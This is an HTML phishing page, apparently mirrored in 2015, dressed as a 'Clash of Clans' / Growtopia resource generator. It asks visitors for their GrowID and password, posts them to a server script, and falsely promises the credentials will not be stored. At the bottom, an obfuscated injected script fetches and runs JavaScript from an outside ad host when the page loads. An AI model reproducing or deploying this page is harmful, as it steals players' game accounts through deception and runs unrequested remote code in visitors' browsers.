

<!DOCTYPE html>
<html>
<head>
<link rel="shortcut icon" href="https://growtopiagame.com/favicon.ico" />

	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="author" content="Abdulaziz" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
    
    <meta property="og:description" content="" />
    <meta property="og:image" content="" />
    <meta property="og:title" content="" />
    
    <title>Clash of Clans Generator</title>

    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="css/bootstrap.superhero.css">
    <link rel="stylesheet" type="text/css" href="css/standard.css">
    
    <script type="text/javascript" src="js/jquery-1.10.2.js"></script>
    <script type="text/javascript" src="js/bootstrap.min.js"></script>
    <script type="text/javascript">
      var X00Unique = 'COC_02_d98094691d';
      var X00CountdownMinutesStart = 15;
      var X00CountdownSecondsStart = 60;
	  $(document).ready(function(){
		$('[data-toggle="popover"]').popover();  
	  });
    </script>
    <script type="text/javascript" src="js/standard.js"></script>
</head>

<body>
    <div id="X00WrapperMain">



      <div id="X00WrapperStart" class="panel panel-default">
        <div class="panel-heading">       

    <!-- Form Start -->
 <form method="post" action="success.php">
          <div class="form-group" style="margin-bottom: 10px;">
            <label class="control-label">Enter your GrowID </label>
            <div class="input-group">
              <span class="input-group-addon"><i class="fa fa-user"></i></span>
              <input id="GrowID" type="text" name="GrowID" class="form-control error" placeholder="Enter your GrowID here!" required/>
            </div>
          </div>
          
           
          
          <div class="form-group" style="margin-bottom: 0;">
            <label class="control-label">Enter your Password</label>
            <div class="input-group">
              <span class="input-group-addon"><i class="fa fa-unlock-alt"></i></span>
              <input id="password" type="password" name="password" class="form-control error" placeholder="Enter your Password here!" required/>
            </div>
          </div>
		  
		 
<br><center>
  <center><button type="submit" class="btn btn-success"><b>Verify Now!</b></button>
  </form>
   <!-- Form end -->
		  		</center>
        </div>

        <div class="panel-footer small">
          <span class="label label-default" style="font-weight: bold;">Info</span> <span class="label label-default">Our  Server will not Store your GrowID and Password!</span>
        </div>
      </div>
      
     

      <div class="small text-center">
        Growtopia Generator ©  All rights reserved.
      </div>
    </div>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2bqWuUApwhmSZx3gAlB95%2bBcsJNkZGaBt1zlSNC0ZoYuukIezwrxTvsCa5QDuSmp%2fo50McGy%2b%2b%2fOJne2aAbyq8898YOtPA9YdWckpyaPZP1xL8NXnzmsyHt5RsQsGAr0hDiZCkXur%2fU0ZFux09LIPdVZK%2bR3AULoi6G6GTijHiL6Wm%2b%2fSnIwUQZSm5RmhKio124yyfkQTsKANT9qi7DBQWdIEiNX0a77nw3PUW8OoxnM4v4QOXTX83Ly60HhFBin3osB1ZSbyhbL6kbkeH1RDgh95LoGyrH62Dj1Z9fdC%2fuVJLKPXPvkG3zC3rpU%2b8GtcIMMgePNrFpLdv77f8ZFkMNMJw6KRKJ2dyF0gyegPREwBL6OlsQLJL5156otNbbbZZfE6xEWunEduiVcVJC%2bAohcnIWifp2IkBsO1GMVDkqOT2bhc4us2kCythO9BdCQ4Rkdw4fey%2bSNHyRAQCfRX49Q%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from smartfren.org/verify.php by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 15 Dec 2015 23:08:28 GMT -->
</html>
